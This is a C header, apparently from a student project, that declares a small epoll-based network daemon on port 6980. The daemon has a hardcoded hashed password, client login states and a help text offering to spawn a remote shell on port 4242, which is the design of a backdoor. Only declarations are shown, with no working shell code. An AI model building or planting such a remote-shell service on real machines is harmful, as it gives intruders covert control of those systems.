#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include "libft.h"

#define DEBUG printf
#define MAX_CLIENTS 3
#define PORT 6980
#define HASHED_PASSWORD 1340397520672655617UL

#define FNV_OFFSET 14695981039346656037UL
#define FNV_PRIME 1099511628211UL

#define HELP							\
"?		show help\n"					\
"shell	spawn remote shell on 4242\n"

typedef enum {
	CLI,
	PASSWORD,
	SHELL
} State;

typedef struct {
	int fd;
	bool logged;
} Client;

void init_clients(Client *clients);
void add_client(Client *clients, int fd);
Client *get_client(Client *clients, int fd);
void disconnect_client(Client *client, int epollfd, struct epoll_event *ev);
void refuse_client(int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev);

int new_connection(
	int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev);
int init_socket(struct sockaddr_in *addr);
